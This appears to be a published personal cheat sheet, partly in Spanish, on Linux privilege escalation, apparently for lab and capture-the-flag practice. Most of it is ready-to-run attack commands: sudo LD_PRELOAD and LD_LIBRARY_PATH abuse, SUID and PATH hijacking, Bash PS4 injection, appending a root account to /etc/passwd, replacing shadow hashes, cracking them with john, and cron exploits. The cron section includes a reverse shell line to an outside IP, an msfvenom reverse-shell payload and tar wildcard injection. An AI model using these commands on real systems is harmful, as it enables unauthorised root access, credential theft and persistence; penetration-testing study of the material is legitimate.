---
{"dg-publish":true,"permalink":"/notes/escalating-privileges/","dgShowToc":"false"}
---

 Important
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Execute any administrative command
- Get that cheeky root flag ;)
![Pasted image 20240607184831.png|500](/img/user/attachments/Pasted%20image%2020240607184831.png)
# Linux privesc
## Basic
### Stable shell

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#technique-1-python" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">

<div class="markdown-embed-title">

# Netcat

</div>


## Technique 1: Python
1. Uses Python to spawn a better featured bash shell;
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
some targets may need replace `python` with `python2` or `python3`
2. access to term commands such as `clear`.
```sh
export TERM=xterm
```
3. Background the shell using Ctrl + Z.
```sh
stty raw -echo; fg
```
This does two things: 
- First, it **turns off our own terminal echo** (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
- then **foregrounds the shell,** thus completing the process.
- Note that **if the shell dies,** any input in your own terminal will **not be visible** (as a result of having disabled terminal echo). To **fix this, type** `reset` and press enter.

</div></div>


### Get a bash
```shell
script /dev/null -c bash
```

### exec bash like a sudo
```shell
sudo -u root /bin/bash
```
## System enumeration - Manual
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



 
| Option                                              | Description                                                                                                                        |
| --------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| `hostname`                                          | Show the hostname                                                                                                                  |
| `hostname -I`<br>`ip a`                             | Show all IPs                                                                                                                       |
| `hostname -i`                                       | Show IP                                                                                                                            |
| `who`                                               | Muestra los usuarios conectados al sistema.                                                                                        |
| `whoiam`                                            | Muestra la inform​acion del usuario actual.                                                                                        |
| `uname`                                             | Muestra inform​acion del sistema.                                                                                                  |
| `uname -a`                                          | Show kernel                                                                                                                        |
| `uname -r`                                          | only kernel                                                                                                                        |
| `cat /etc/issue`<br><br>`cat /etc/os-release`       | Show linux OS version                                                                                                              |
| `env`                                               | print enviroment variables of current session                                                                                      |
| `id`                                                | Muestra el identi​ficador y el grupo de usuario.                                                                                   |
| `cat /etc/passwd`                                   | Información de usuarios                                                                                                            |
| `history`                                           | Commands history                                                                                                                   |
| `ifconfig`                                          | Show interfaces                                                                                                                    |
| `ip route`                                          | See which network routes exist.                                                                                                    |
| `cat /proc/version`                                 | Info about the target system processes, kernel and compiler version                                                                |
| `netstat -nat`<br>`ss -nltp`<br>`cat /proc/net/tcp` | Get info about ports                                                                                                               |
| `logname`                                           | Muestra inform​acion del usuario conectado.                                                                                        |
| `date`                                              | Informa de la fecha y hora actual.                                                                                                 |
| `which cat`<br>`command -v cat`<br>`which whoami`   | Mostrar la ruta absoluta de un binario                                                                                             |
| `echo $SHELL`                                       | Mostrar Tipo de shell actual                                                                                                       |
| `cat /etc/shells`<br>`chsh -l`                      | Mostrar Tipos de shell                                                                                                             |
| `chch -s /bin/zsh`                                  | Change shell (Require restart)                                                                                                     |
| `echo $PATH`                                        | Mostrar el Path donde busca los archivos para ejecutar                                                                             |
| `echo $?`                                           | Mostrar el código de estado del comando anterior<br> 0(exitoso), 1(no exitoso)                                                     |
| `lsof -i:22`                                        | Get info about the service running in the port                                                                                     |
| `./`                                                | Current directory                                                                                                                  |
| `../`                                               | pass level of directory, 1 level up                                                                                                |
| `id -u`                                             | if the answer is 0, I am root                                                                                                      |

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                      | Description                                       |
| ------------------------------------------- | ------------------------------------------------- |
| `ps`                                        | List running processes basic                      |
| `ps -faux`                                  | Common use                                        |
| `ps -faux \| grep -iE "sql\|db\|postgres" ` | Example to search some databases                  |
| `ps -A`                                     | View all running processes                        |
| `ps axjf`                                   | View process tree                                 |
| `ps -eo command`                            | List all running commands                         |
| `ps -a`                                     | Processes for all users (a)                       |
| `ps -u`                                     | Display the user that launched the process (u)    |
| `ps -x`                                     | Processes that are not attached to a terminal (x) |
| `ps -f`                                     | Do full-format listing                            |


</div></div>


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>


</div></div>



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

# find

</div>



| Option                                                                                                                                                        | Description                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| `find .`                                                                                                                                                      | Search in the currenty dir                             |
| `find / -name dirname`                                                                                                                                        | Find a dirs by name in the /                           |
| `find . -iname my-file`                                                                                                                                       | Don't differen between Mayus                           |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | Redirect the (stderr) to a hole                        |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | list the contend of each dir                           |
| `find / -type f -perm -u=s -ls 2>/dev/null`<br>`find / -type f -perm -4000 -ls 2>/dev/null`                                                                   | Search files [[SUID\|SUID]]                                  |
| `find / -perm -g=s -type f -ls 2>/dev/null`<br>`find / -type f -perm -2000 -ls 2>/dev/null`                                                                   | Search files [[GUID\|GUID]]                                  |
| `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`                                                                             | Combine conditions [[SUID\|SUID]] or [[SGID\|SGID]]<br>`-o ` is OR |
| `find / -type -d -group wheel 2>/dev/null`                                                                                                                    | find dirs in the group wheel                           |
| `find -executable`<br>`find / -perm a=x`                                                                                                                      | Find items executable                                  |
| `find / -writable -type d 2>/dev/null`<br>`find / -perm -222 -type d 2>/dev/null`<br>`find / -perm -o w -type d 2>/dev/null`                                  | Find world-writable folders                            |
| `find / -writable -type d 2>/dev/null \| cut -d "/" -f 2 \| sort -u`                                                                                          | First Writable folders                                 |
| `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u`<br>`find / -writable 2>/dev/null \| grep  usr \| cut -d "/" -f 2,3 \| sort -u` | 1 and 2 Writable folders<br>`usr`                      |
| `find ! -executable`                                                                                                                                          | Find items **not** executables                         |
| `find / -user root -writable 2>/dev/null`<br>`find / -user root -executable -type -f 2>/dev/null`<br>                                                         | Find items from root user                              |
| `find -name dex\* 2>/dev/null`                                                                                                                                | Find files that start by dex                           |
| `find -name \*exdump\* 2>/dev/null`                                                                                                                           | FInd files that content exdump between his name        |
| `find -name dex\*.sh 2>/dev/null`                                                                                                                             | Start with dex and finish in .sh                       |
| `find / -size +5G`                                                                                                                                            | List all files with more than 5 Gigabites              |
| `find / -size 10M`                                                                                                                                            | List all files with exactly 10 megabytes               |
| `find / -size -5M`                                                                                                                                            | List all files with less than 5 megabytes              |
| `find / - empty`                                                                                                                                              | Find empty items in the system                         |
| `find . -name "*.md*" -type f -exec grep -l "text to search" {} +`                                                                                            | Search a file by the content of it                     |
| `find / -mtime 10`                                                                                                                                            | Find files that were modified in the last 10 days      |
| `find / -atime 10`                                                                                                                                            | Find files that were accessed in the last 10 day       |
| `find / -cmin -60`                                                                                                                                            | find files changed within the last hour (60 minutes)   |
| `find / -amin -60`                                                                                                                                            | find files accesses within the last hour (60 minutes)  |

- **c** – bytes
- **k** – kilobytes
- **M** – megabytes
- **G** – gigabytes
- **b** – trozos de 512 bytes

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### netstat

</div>


Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>

### Check databases

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                      | Description                                       |
| ------------------------------------------- | ------------------------------------------------- |
| `ps`                                        | List running processes basic                      |
| `ps -faux`                                  | Common use                                        |
| `ps -faux \| grep -iE "sql\|db\|postgres" ` | Example to search some databases                  |
| `ps -A`                                     | View all running processes                        |
| `ps axjf`                                   | View process tree                                 |
| `ps -eo command`                            | List all running commands                         |
| `ps -a`                                     | Processes for all users (a)                       |
| `ps -u`                                     | Display the user that launched the process (u)    |
| `ps -x`                                     | Processes that are not attached to a terminal (x) |
| `ps -f`                                     | Do full-format listing                            |


</div></div>


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>


## System enumeration - Automated
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### linpeas

</div>


to scan vulns in linux

```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh
```



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### lse

</div>


``` shell
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh
```

execute more deep scan
```
./lse.sh -l 2
```

[[lse code\|lse code]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### LinEnum

</div>


```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### pspy

</div>


- snoop on processes without need for root permissions.
- see commands run by other users, cron jobs, etc.
```sh
https://github.com/DominicBreuker/pspy/releases
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### LES

</div>


- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Linux Smart Enumeration

</div>


- [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Linux Priv Checker

</div>


- [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


</div></div>

## Sudo -l
```bash
sudo -l
```

to check another user
```shell
sudo -l -U tracy
```

Execute a file like the owner
```shell
sudo -u USERNAME ./script.sh
```
### Shell Escape Sequences
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [[sudo -l\|sudo -l]]
### Leverage application functions
- Some applications will not have a known exploit within this context.
- we can use a "hack" to leak information **leveraging a function of the application.**

Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### sudo Environment Variables

</div>


- Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
- Check which environment variables are inherited (look for the env_keep options):
```shell
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
- LD_PRELOAD and LD_LIBRARY_PATH are both **inherited from the user's environment**.
- LD_PRELOAD loads a shared object before any others when a program is run.
- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
### LD_PRELOAD
- Create a shared object using the code located at /home/user/tools/sudo/[[preload.c\|preload.c]]:
```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
- Run one program (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
- A root shell should spawn.
```shell
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
### LD_LIBRARY_PATH
Run ldd against the apache2 program file to see which shared libraries are used by the program:
```shell
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/[[library_path.c\|library_path.c]]:
```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp
```shell
sudo LD_LIBRARY_PATH=/tmp apache2
```

</div></div>

## SUID-SGID executable scaling
- https://gtfobins.github.io/
- [[SUID\|SUID]] [[SGID\|SGID]]
Check files with [[SUID\|SUID]] or [[SGID\|SGID]] permission
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check files with [[SUID\|SUID]] permission
```shell
find / -type f -perm -u=s -ls 2>/dev/null
```
```shell
find / -type f -perm -4000 -ls 2>/dev/null
```
Check files with [[SGID\|SGID]] permission
```shell
find / -perm -g=s -type f -ls 2>/dev/null
```
```shell
find / -type f -perm -2000 -ls 2>/dev/null
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Known exploits

</div>


- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!


| exim-4.84-3 | [[cve-2016-1531.sh\|cve-2016-1531.sh]] |
| ----------- | -------------------- |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Shared Object injection

</div>


- If we have a executable
- Search if is trying to load shared objects, but it cannot be found.
```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  ```

- like this
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`

- Create the **.config** directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```
- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Run again
`/usr/local/bin/suid-so`

`strace /usr/bin/mount 2>&1 | grep -iE "open|access|no such file"`

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### SUID exploit enviroment var

</div>


- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
- In this example the executable is trying to start an apache2 webserver
- Use `string` to look for string in the file.
```shell
strings /usr/local/bin/suid-env
```
- One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however **the full path** of the executable (/usr/sbin/service) **is not being used**.
- Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
```shell
gcc -o service /home/user/tools/suid/service.c
```
- Or like an e.g. copy the shell file as a executable
```shell
echo /bin/bash > file_to_execute
```
- Change the PATH [[PATH exploiting\|PATH exploiting]]
```shell
export PATH=/path_to_executable:$PATH
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Abusing shell

</div>


## Bash versions below `4.2-048`
- Define shell **functions** with **names** that **resemble** file paths
- then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
- If we have an executable `strings /usr/local/bin/suid-env2`
`strings /usr/local/bin/suid-env2`
`/usr/sbin/service apache2 start`
- Create a Bash function with the name `usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved)
```shell
function /usr/sbin/service { /bin/bash -p; }
```
- export the function:
```shell
export -f /usr/sbin/service
```
- Run the executable
## Bash versions below `4.4`
-  If we have an executable 
- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```shell
/tmp/rootbash -p
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Python SUID

</div>


set to root
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami")'
```

set to root and open a bash 
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
```

Option to show the results
```python
import os; print(os.popen("ls -l").read())
```

subproccess.run([comando])

with sys module too

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Capabilities

</div>


## Ver y cambiar capabilities
Como /usr está en modo lectura es necesario montarlo como escritura para poder editar las capabilities de este.
```shell
mount -o remount, rw /usr
setcap cap_net_admin,cap_net_raw+eip /usr/bin/wireshark
```

| Option                       | Description                          |
| ---------------------------- | ------------------------------------ |
| `getcap file`                | List capabilities simple             |
| `getcap -r / 2>/dev/null`    | List capabilities recursive from `/` |
| `setcap cap_setupid+ep file` | change                               |
| `setcap -r file`             | Remove                               |
## Lista de capabilities

Hasta la versión 2.4.18 de Linux, las siguientes capacidades están implementadas:

| Capability           | Description                                                                                                                                                                                                                                                                                                                                                                                                                              |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CAP_SETUID           | Permite  manipulaciones arbitrarias de los IDs de usuario de los procesos (setuid(2), etc.); permite el uso  de  IDs  de  usuario falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                                        |
| CAP_SETGID           | Permite  manipulaciones arbitrarias de los IDs de grupo y de la lista de IDs de grupo adicionales de un proceso; permite el  uso de  IDs  de  grupo  falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                     |
| CAP_CHOWN            | Permite cambios arbitrarios en los IDs de usuario y de grupo de los ficheros (vea chown(2)).                                                                                                                                                                                                                                                                                                                                             |
| CAP_DAC_OVERRIDE     | Evita  las  comprobaciones de permisos sobre operaciones de lectura, escritura y ejecución.  (DAC = "control de acceso  discre-cional".)                                                                                                                                                                                                                                                                                                 |
| CAP_DAC_READ_SEARCH  | Evita comprobaciones de permisos sobre operaciones de lectura de ficheros y lectura y ejecución de directorios.                                                                                                                                                                                                                                                                                                                          |
| CAP_FOWNER           | Evita comprobaciones de permisos sobre operaciones  que  normalmente requieren que el ID de usuario del sistema de ficheros del proceso coincida  con  el  ID  de  usuario  del  fichero  (p.e., utime(2)),   excluyendo   aquellas   operaciones  cubiertas  por CAP_DAC_OVERRIDE y CAP_DAC_READ_SEARCH; ignora el  bit  pegajoso (sticky) en el borrado de ficheros.                                                                   |
| CAP_FSETID           | No  borra los bits set-user-ID y set-group-ID cuando se modifica un fichero; permite  establecer  el  bit  set-group-ID  para  un fichero  cuyo  ID  de  grupo  no  coincide con el del sistema de ficheros o cualquier otro ID  de  grupo  adicional  del  proceso invocador.                                                                                                                                                           |
| CAP_IPC_LOCK         | Permite  el  bloqueo  en  memoria  (mlock(2),  mlockall(2), shm-ctl(2)).                                                                                                                                                                                                                                                                                                                                                                 |
| CAP_IPC_OWNER        | Evita comprobaciones de  permisos  para  las  operaciones  sobre objetos System V IPC.                                                                                                                                                                                                                                                                                                                                                   |
| CAP_KILL             | Evita  comprobaciones  de  permisos  para  enviar  señales  (vea kill(2)).                                                                                                                                                                                                                                                                                                                                                               |
| CAP_LEASE            | (Linux 2.4 en adelante)  Permite que  se  establezcan  arriendos sobre ficheros arbitrarios (vea fcntl(2)).                                                                                                                                                                                                                                                                                                                              |
| CAP_LINUX_IMMUTABLE  | Permite  establecer  los  atributos  extendidos EXT2_APPEND_FL y EXT2_IMMUTABLE_FL sobre ficheros del sistema de ficheros ext2.                                                                                                                                                                                                                                                                                                          |
| CAP_MKNOD            | (Linux 2.4 en adelante) Permite la creación  de  ficheros  especiales usando mknod(2).                                                                                                                                                                                                                                                                                                                                                   |
| CAP_NET_ADMIN        | Permite   varias   operaciones  relacionadas  con  redes  (p.e., establecer opciones privilegiadas sobre conectores, habilitar la difusión  de paquetes multidestino (multicasting), configuración de interfaces, modificar tablas de encaminamiento).                                                                                                                                                                                   |
| CAP_NET_BIND_SERVICE | Permite ligar conectores a puertos  reservados  del  dominio  de Internet (números de puerto menores que 1024).                                                                                                                                                                                                                                                                                                                          |
| CAP_NET_BROADCAST    | (No  se  usa)  Permite  la  difusión universal (broadcasting) de paquetes a través de un conector y la escucha de paquetes multidestino.                                                                                                                                                                                                                                                                                                 |
| CAP_NET_RAW          | Permite el uso de conectores de tipo RAW y PACKET.                                                                                                                                                                                                                                                                                                                                                                                       |
| CAP_SETPCAP          | Concede o elimina cualquier capacidad en el conjunto de  capacidades permitidas del invocador a o desde cualquier otro proceso.                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_ADMIN        | Permite una variedad de operaciones de administración  del  sistema  incluyendo:  quotactl(2),  mount(2),  swapon(2),  sethostname(2), setdomainname(2), IPC_SET y operaciones IPC_RMID  sobre objetos  arbitrarios  IPC  de System V; permite el uso de IDs de usuario falsificados cuando se pasan credenciales de conectores.                                                                                                         |
| CAP_SYS_BOOT         | Permite llamadas a reboot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_CHROOT       | Permite llamadas a chroot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_MODULE       | Permite cargar y eliminar módulos del núcleo.                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_NICE         | Permite aumentar el valor nice del proceso  invocador  (nice(2), setpriority(2)) y cambiar el valor nice de procesos arbitrarios; permite establecer políticas de  planificación  de  tiempo  real para  el  proceso  invocador  y establecer políticas de planificación y prioridades para procesos arbitrarios  (sched_setscheduler(2), sched_setparam(2)).                                                                            |
| CAP_SYS_PACCT        | Permite llamadas a acct(2).                                                                                                                                                                                                                                                                                                                                                                                                              |
| CAP_SYS_PTRACE       | Permite  el seguimiento detallado de procesos arbitrarios usando ptrace(2)                                                                                                                                                                                                                                                                                                                                                               |
| CAP_SYS_RAWIO        | Permite operaciones sobre puertos de E/S (iopl(2) y ioperm(2)).                                                                                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_RESOURCE     | Permite el uso de espacio  reservado  en  sistemas  de  ficheros ext2;  llamadas  ioctl(2)  para  controlar  el registro en ext3; sobrescribir los límites de las cuotas de disco; incrementar los límites  de  recursos (vea setrlimit(2)); sobrescribir el límite del recurso RLIMIT_NPROC; incrementar el límite msg_qbytes para una  cola  de  mensajes  por encima del limite en /proc/sys/kernel/msgmnb (vea msgop(2) y msgctl(2). |
| CAP_SYS_TIME         | Permite la modificación del reloj del sistema  (settimeofday(2), adjtimex(2));  permite  la modificación del reloj de tiempo real (hardware)                                                                                                                                                                                                                                                                                             |
| CAP_SYS_TTY_CONFIG   | Permite llamadas a vhangup(2).                                                                                                                                                                                                                                                                                                                                                                                                           |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## PATH exploiting

</div>


- If we have [[SUID\|SUID]] binary
- Re-write the PATH variable to a location of our choosing!
- When the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

Example with `ls`

```shell
cd /tmp && \
echo "[whatever command we want to run]" > [name of the executable we are imitating]
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

Check which folders can I write.

</div></div>

## Weak file permissions
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Writable passwd

</div>


### Create a new user
- write a new line entry create a new user!
- Add the password hash of our choice, and set the UID, GID and shell to root.

```shell
openssl passwd -1 -salt [salt] [password]
```

```
new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

```shell
echo 'new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Replace the hash of root
Generate password
```shell
openssl passwd [password]
```

Edit the `/etc/passwd` file and place the generated password hash between the first and second colon (:) of the root user's row **(replacing the "x").**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Readable shadow - cracking hashes

</div>


- The /etc/shadow file is the file on Linux machines where password hashes are stored.
- It also stores other information, such as the date of last password change and password expiration information
# unshadow

John can be very particular about the formats it needs data in to be able to work with it.
you must **combine** it with the /etc/passwd file

``` bash
unshadow [path to passwd] [path to shadow]
```

``` bash
unshadow local_passwd local_shadow > unshadowed.txt
```

use just the relevant line

local_passwd  
Contains the /etc/passwd line for the root user:
local_shadow
Contains the /etc/shadow line for the root user:
# cracking
in some cases you will need to specify the format as we have done previously using: `--format=sha512crypt`

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Writeable shadow

</div>


Generate a new password hash with a password of your choice:
```shell
mkpasswd -m sha-512 newpasswordhere
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

	su root

</div></div>

## Cron jobs exploiting
Look for jobs, and try to exploit them
System crontab
```shell
/etc/crontab
/etc/cron.d
/etc/rc.d/
/etc/init.d
```
Users crontabs
```shell
/var/spool/cron
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - File permissions

</div>


check permissions of the scripts
and add a basic bash
```shell
echo 'bash -i>&/dev/tcp/10.13.51.143/4747 0>&1' >> /script.sh
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - PATH

</div>


- check the crontabs
- If a script exist with no direct path like
`* * * * * root overwrite.sh`
- We can check if we have permissions to create an imitate script in some dir of the PATH
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
- If it's possible, create a script and make exec,
- one options is make a copy of the root bash
```shell
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

- Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
	`/tmp/rootbash -p`


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - Wildcards

</div>


- Check the scripts with tar, 7z, rsync, etc.
- Search a `*` like
```shell
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
- GTFOBins, Note that tar has command line options that let you **run** other **commands** as part of a checkpoint feature.
- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
- Put it to `/home/user`
- Make it executable:
`chmod +x /home/user/shell.elf`
- Create these two files in /home/user:
Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
